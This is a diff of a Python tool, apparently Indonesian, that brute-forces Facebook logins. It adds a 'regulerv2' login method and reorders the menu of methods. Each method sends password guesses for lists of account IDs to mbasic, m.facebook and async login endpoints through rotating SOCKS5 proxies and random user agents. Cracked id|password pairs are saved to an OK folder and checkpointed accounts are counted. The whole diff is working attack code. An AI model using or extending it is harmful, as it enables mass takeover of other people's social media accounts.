@@ -1448,7 +1448,7 @@ def setting():
         exit()
     Console().print(
         Panel(
-            f"{P2}[{color_text}01{P2}] Login Site [bold green]async.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]validate.facebook.com[bold white]\n{P2}[{color_text}03{P2}] Login Site [bold green]reguler.facebook.com[bold white]\n{P2}[{color_text}04{P2}] Login Site [bold green]mbasic.facebook.com[bold white] [/]",
+            f"{P2}[{color_text}01{P2}] Login Site [bold green]mbasic.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]validate.facebook.com[bold white]\n{P2}[{color_text}03{P2}] Login Site [bold green]reguler.facebook.com[bold white]\n{P2}[{color_text}04{P2}] Login Site [bold green]regulerv2.facebook.com[bold white] [/]\n{P2}[{color_text}05{P2}] Login Site [bold green]async.facebook.com[bold white] [/]",
             width=60,
             style=f"{color_panel}",
             title="[bold green] Method",
@@ -1456,15 +1456,17 @@ def setting():
     )
     hc = console.input(f" {H2}• {P2}Masukan : ")
     if hc in ["1", "01"]:
-        method.append("asyn")
+        method.append("mbasik")
     elif hc in ["2", "02"]:
         method.append("validate")
     elif hc in ["3", "03"]:
         method.append("reguler")
     elif hc in ["4", "04"]:
-        method.append("mbasik")
+        method.append("regulerv2")
+    elif hc in ["5", "05"]:
+        method.append("asyn")
     else:
-        method.append("reguler")
+        method.append("mbasik")
     Console().print(
         Panel(
             f"[bold white]Apakah Anda Ingin Mengunakan UA Manual ? Y/T",
@@ -1585,8 +1587,10 @@ def passwrd():
                     pool.submit(validate, idf, pwv)
                 elif "mbasik" in method:
                     pool.submit(mbasic, idf, pwv)
+                elif "regulerv2" in method:
+                    pool.submit(regulerv2, idf, pwv)
                 else:
-                    pool.submit(crackreg, idf, pwv)
+                    pool.submit(mbasic, idf, pwv)
         print("")
     Console().print(
         Panel(
@@ -1599,35 +1603,27 @@ def passwrd():
         )
     )
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
-    Console().print(
-        Panel(
-            " [bold green]Lanjut Crack Kembali ?  Y/T  ",
-            width=60,
-            style=f"{color_panel}",
-        )
-    )
-    li = console.input(f" {H2}• {P2}pilih : ")
-    if li in ["Y", "y"]:
-        back()
-    else:
-        Console().print(f"[bold green]	\n[bold yellow]God Bye Kawan")
-        time.sleep(1)
-        exit()
+    print("thanks Rudal-XD")
+    print("")
 
+# --------------------[ METODE MBASIC ]-----------------#
+uabb=[]
 def mbasic(idf,pwv):
 	global loop,ok,cp
-	bi = random.choice([u,k,kk,b,h,hh])
-	pers = loop*100/len(id2)
-	fff = '%'
+	uaa = open("Useragent.txt", "r").read().splitlines()
+	for ub in uaa:
+		uabb.append(ub)
+	bo = random.choice([u,k,kk,b,h,hh])
 	nip=random.choice(prox)
 	proxs= {'http': 'socks5://'+nip}
-	ua = random.choice(prem)
+	ua = random.choice(uabb)
 	ua2 = random.choice(prem)
 	ses = requests.Session()
 	prog.update(des,description=f" {K2}•{H2} MBASIC {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
 	for pw in pwv:
 		try:
+			if "ya" in ualuh:ua = ualu[0]
 			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
 			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
@@ -1671,25 +1667,22 @@ def mbasic(idf,pwv):
 				prints(tree)
 				os.popen("play-audio o.mp3")
 				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
-				cek_apk(kuki)
 				break
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
-# --------------------[ METODE VALIDATE ]-----------------#
-def crackreg(idf,pwv):
+# --------------------[ METODE REGULERV2 ]-----------------#
+def regulerv2(idf,pwv):
 	global loop,ok,cp
-	bi = random.choice(['\33[m'])
-	pers = loop*100/len(id2)
-	fff = '%'
-	prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.update(des,description=f" {K2}•{H2} REGULER V2 {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
 	ua = random.choice(prem)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
+			if "ya" in ualuh:ua = ualu[0]
 			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=290293790992170&kid_directed_site=0&app_id=290293790992170&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3D0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&cancel_url=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
 			data = {
 'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
@@ -1749,7 +1742,6 @@ def crackreg(idf,pwv):
 				prints(tree)
 				os.popen("play-audio o.mp3")
 				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
-				cek_apk(kuki)
 				break
 			else:
 				continue
@@ -1761,7 +1753,7 @@ def validate(idf, pwv):
     global loop, ok, cp
     bo = random.choice([m, k, h, b, u, x])
     ua = random.choice(prem)
-    # ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
+    ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
     ses = requests.Session()
     prog.update(
         des,
@@ -1871,7 +1863,6 @@ def validate(idf, pwv):
                 prints(tree)
                 os.popen("play-audio o.mp3")
                 open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
-                cek_apk(kuki)
                 break
             else:
                 continue
@@ -2039,7 +2030,6 @@ def asyncc(idf, pwv):
                 prints(tree)
                 os.popen("play-audio o.mp3")
                 open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
-                cek_apk(kuki)
                 break
             else:
                 continue
@@ -2106,7 +2096,7 @@ def reguler(idf,pwv,url):
 "accept-encoding": "gzip, deflate, br",
 "sec-websocket-version": str(rr(5,13)),
 "accept-language": AinkRaka}
-			hehehe = ses.post(f'https://{url}/login/device-based/login/async/?api_key=3446862972255280&auth_token=f302da384cd8cc53013e453112408164&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&refsrc=deprecated&app_id=3446862972255280&cancel=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&lwv=100', headers=head, data=date, allow_redirects=False)
+			po = ses.post(f'https://{url}/login/device-based/login/async/?api_key=3446862972255280&auth_token=f302da384cd8cc53013e453112408164&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&refsrc=deprecated&app_id=3446862972255280&cancel=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&lwv=100', headers=head, data=date, allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				cp += 1
 				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
@@ -2143,7 +2133,6 @@ def reguler(idf,pwv,url):
 				prints(tree)
 				os.popen("play-audio o.mp3")
 				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
-				cek_apk(kuki)
 				break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
